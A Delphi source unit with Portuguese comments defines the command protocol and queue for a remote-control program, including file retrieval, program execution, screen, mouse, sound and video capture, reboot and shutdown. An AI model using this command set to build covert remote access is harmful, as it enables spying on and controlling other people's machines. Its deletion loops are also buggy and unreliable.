unit comando;

interface

uses classes, sysUtils;


const
     PORT_TCP_SERVER = 19670;
     PORT_UDP_SERVER = PORT_TCP_SERVER + 1;

     EMAIL_TITULO = '{C44BA8EC-E151-4C34-8B8E-5A421E6BEBA2}';


      //comandos string
      COMM_STR_PING = 'PING';

      COMM_STR_MSG = 'MSSG';
      COMM_STR_CHAT = 'CHAT_';
      COMM_STR_SOUND = 'SOUN';

      COMM_STR_GETFILE = 'GFIL';
      COMM_STR_GETLISTDIR = 'GLDI';
      COMM_STR_GETSCRIPT = 'GSCR';
      COMM_STR_RUN = 'RUN_';     

      COMM_STR_REBOOT = 'REBO';
      COMM_STR_SHOOTDONW = 'SHOO';
      COMM_STR_GETSCREEN = 'SCRE';
      COMM_STR_GETMOUSE = 'GMOU';
      COMM_STR_RELEASEMOUSE = 'RMOU';

      COMM_STR_WWW = 'WWW_';
      COMM_STR_SENDMAIL = 'SMAI';

      COMM_STR_VIDEO = 'VIDE';

      //params
      COMM_STR_PARAMS_MSG_OKCANCEL = 'OK/CANCEL';
      COMM_STR_PARAMS_MSG_YESNO = 'YES/NO';

      COMM_STR_PARAMS_SOUND_LIST = 'LIST';
      COMM_STR_PARAMS_SOUND_START = 'START';
      COMM_STR_PARAMS_SOUND_START_DEVICE = 'STARTD';
      COMM_STR_PARAMS_SOUND_STOP = 'STOP';

      //COMM_STR_PARAMS_SOUND_START = 'START';



      //respostas ERRO id
      RESP_OK : Smallint = 0;    //operaÇÃo executada com exito
      RESP_ERRO : Smallint = -1; //operaÇÃo não executada.

      RESP_MSG_TIMEOUT = 100;    //a mensagem se encerrou antes da resposta
      RESP_MSG_OK = 101;         //resposta OK para a mensagem
      RESP_MSG_YES = 102;        //resposta YES para a mensagem
      RESP_MSG_NO = 103;         //resposta NO para a mensagem
      RESP_MSG_CANCEL = 104;     //resposta CANCEL para a mensagem
      RESP_MSG_CHAT = 120;       //erro chat não aceite


      RESP_GETFILE = 200;       //erro transferir arquivo
      RESP_GETLISTDIR = 201;     //erro ao enviar lista de um diretorio
      RESP_GETLISTDIR_NODIR = 202;     //erro diretorio nao existe
      RESP_GETSCRIPT = 220;      //erro ao receber script

      RESP_RUN = 300;            //erro ao correr programa
      RESP_RUN_NOFILE = 301;     //programa nao existe


      RESP_REBOOT = 400;         //erro ao reiniciar sistema
      RESP_SHOOTDONW = 401;      //erro ao desligar sistema
      RESP_GETSCREEN = 402;      //erro ao enviar desktop
      RESP_GETMOUSE = 403;       //erro ao capturar mouse
      RESP_RELEASEMOUSE = 404;   //erro ao libertar mouse


      RESP_WWW = 500;            //erro ao visitar site na web
      RESP_SENDMAIL = 501;       //erro ao enviar email  



type
  PArquivoInfo = ^TArquivoInfo;
  TArquivoInfo = record
    Time,
    Size,    Attr: Integer;    Name: array[0..255] of char;  end;

  TarrArquivoInfo = array of TArquivoInfo;
  ParrArquivoInfo = ^TarrArquivoInfo;

  TResposta = record
    texto : string;
    valor : integer;
  end;

  TComando = record
    nome : string;
    params : string;
    id   : integer;
    Enviado : boolean;
    resposta : TResposta;
  end;

  TComandosClass = class
  private
    Comandos : array of TComando;
    procedure Delete(id : integer); overload;
  public
    destructor Destroy; override;
    function Add : TComando; overload;
    procedure Add(comm : TComando) ; overload;
    procedure Delete(comm : TComando); overload;
    procedure ClearSendComm;
    procedure ClearRespostaOK;
    procedure Clear;
    procedure Flush(Mode: Word) ;

    function Count : integer;

  end;



implementation

{ TComandosClass }

function TComandosClass.Add: TComando;
begin
  SetLength(comandos, length(comandos) + 1);
  result := Comandos[high(comandos)];
  FillChar(result, sizeof(TComando), #0);
  result.id := high(comandos);        
end;

procedure TComandosClass.Add(comm: TComando);
begin
  SetLength(comandos, length(comandos) + 1);
  comm.id := high(comandos);
  Comandos[high(comandos)] := comm;
end;

procedure TComandosClass.Clear;
begin
  setlength(comandos, 0);
  comandos := nil;
end;

function TComandosClass.Count: integer;
begin
  result := length(comandos);
end;

procedure TComandosClass.Delete(id: integer);
var
  I: Integer;
begin
  for i:= id to high(comandos)-1 do    // Iterate
    comandos[i] := comandos[i+1];
  if length(comandos) > 0 then setlength(comandos, length(comandos)-1);
end;

procedure TComandosClass.Delete(comm: TComando);

  function MatchComm(comm1, comm2 : TComando) : boolean;
  begin
    result := ( trim(comm1.nome) = trim(comm2.nome)) and
              ( trim(comm1.params) = trim(comm2.params)) and
              (comm1.id = comm2.id);
  end;

var
  I: Integer;
begin
  for I := 0 to high(comandos) do    // Iterate
    if MatchComm(comandos[i],comm) then
      delete(i);
end;

procedure TComandosClass.ClearSendComm;
var
  I: Integer;
begin
  for I := 0 to high(comandos) do    // Iterate
    if comandos[i].Enviado then
      Delete(i);
end;

procedure TComandosClass.ClearRespostaOK;
var
  I: Integer;
begin
  for I := 0 to high(comandos) do    // Iterate
    if comandos[i].resposta.valor = RESP_OK then
      Delete(i);
end;

destructor TComandosClass.Destroy;
begin
  clear;
  inherited;
end;

procedure TComandosClass.Flush;
begin
  case mode of
    fmCreate:;
    fmOpenReadWrite:;
  end;
end;

end.
